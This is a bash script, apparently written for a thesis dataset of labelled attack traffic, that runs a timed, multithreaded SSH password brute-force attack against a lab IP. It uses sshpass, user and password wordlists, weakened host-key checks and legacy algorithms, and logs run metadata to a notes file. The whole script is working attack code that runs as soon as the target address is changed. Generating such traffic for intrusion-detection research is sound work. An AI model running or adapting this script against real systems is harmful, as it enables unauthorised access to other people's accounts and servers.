#!/usr/bin/env bash
set -euo pipefail

RUN_NAME="$1"
NOTES_FILE="$2"
TARGET_IP="192.168.9.131"

SEED=${SEED:-$RANDOM}
RANDOM=$SEED

# ========== 可调参数 ==========
THREADS=${THREADS:-8}
TIMEOUT_PER_BATCH=${TIMEOUT_PER_BATCH:-12}
ATTACK_DURATION=${ATTACK_DURATION:-300}
USER_FILE="$HOME/thesis_dataset/scripts/wordlists/users.txt"
PASS_FILE="$HOME/thesis_dataset/scripts/wordlists/pass_massive.txt"
TEMP_PASS="/tmp/ssh_temp_pass_${SEED}.txt"
# PROFILE_ID 留空，后续可以在 notes 中手动维护
PROFILE_ID="${PROFILE_ID:-}"
# ==============================

# SSH 选项：用字符串而不是 Bash 数组，确保能传入 xargs 子 shell
SSH_OPTIONS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group14-sha1 -o ConnectTimeout=2 -o BatchMode=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -o PasswordAuthentication=yes -o NumberOfPasswordPrompts=1"

mkdir -p "$(dirname "$TEMP_PASS")"
trap 'rm -f "$TEMP_PASS"' EXIT

TOTAL_PASS=$(wc -l < "$PASS_FILE")
LINE_INDEX=1

# ========== notes 元信息 ==========
echo "RUN_ID=$RUN_NAME" | tee -a "$NOTES_FILE"
echo "RANDOM_SEED=$SEED" | tee -a "$NOTES_FILE"
echo "ATTACK_CATEGORY=brute_force" | tee -a "$NOTES_FILE"
echo "ATTACK_SUBTYPE=ssh" | tee -a "$NOTES_FILE"
echo "PROFILE_ID=$PROFILE_ID" | tee -a "$NOTES_FILE"
echo "PROTOCOL=ssh" | tee -a "$NOTES_FILE"
echo "TOOL=sshpass_system_ssh" | tee -a "$NOTES_FILE"
echo "THREADS=$THREADS" | tee -a "$NOTES_FILE"
echo "TIMEOUT_PER_BATCH=$TIMEOUT_PER_BATCH" | tee -a "$NOTES_FILE"
echo "ATTACK_DURATION=$ATTACK_DURATION" | tee -a "$NOTES_FILE"
# ==================================

echo "等待 9 秒前置静默期..."
sleep 9

echo "ATTACK_START $(date -u +'%Y-%m-%d %H:%M:%S UTC')" | tee -a "$NOTES_FILE"
START_TIME=$SECONDS

while [ $((SECONDS - START_TIME)) -lt $ATTACK_DURATION ]; do
    CURRENT_TIME=$((SECONDS - START_TIME))

    if [ $CURRENT_TIME -lt 60 ]; then
        MULTIPLIER=2
        SLEEP_TIME=$(( (RANDOM % 2) + 1 ))
    elif [ $CURRENT_TIME -lt 240 ]; then
        MULTIPLIER=$(( (RANDOM % 5) + 8 ))
        SLEEP_TIME=$(( RANDOM % 3 ))
    else
        MULTIPLIER=2
        SLEEP_TIME=$(( (RANDOM % 2) + 2 ))
    fi

    CHUNK_SIZE=$(( THREADS * MULTIPLIER * 2 ))

    if [ $LINE_INDEX -gt $TOTAL_PASS ]; then
        LINE_INDEX=1
    fi
    sed -n "${LINE_INDEX},$((LINE_INDEX + CHUNK_SIZE - 1))p" "$PASS_FILE" > "$TEMP_PASS"
    LINE_INDEX=$((LINE_INDEX + CHUNK_SIZE))

    TARGET_USER=$(shuf -n 1 "$USER_FILE")

    echo "[*] ${CURRENT_TIME}s: protocol=ssh threads=$THREADS chunk=$CHUNK_SIZE user=$TARGET_USER"

    export TARGET_USER TARGET_IP SSH_OPTIONS
    timeout "$TIMEOUT_PER_BATCH" cat "$TEMP_PASS" \
    | xargs -P "$THREADS" -I{} bash -c '
        sshpass -p "$(printf "%s" "{}")" ssh $SSH_OPTIONS "$TARGET_USER@$TARGET_IP" "exit" 2>/dev/null
        true
    ' || true

    sleep "$SLEEP_TIME"
done

echo "ATTACK_END $(date -u +'%Y-%m-%d %H:%M:%S UTC')" | tee -a "$NOTES_FILE"
echo "MODULE_SUMMARY=ssh_failed_password_bruteforce_v2" | tee -a "$NOTES_FILE"
echo "等待 9 秒后置静默期..."
sleep 9
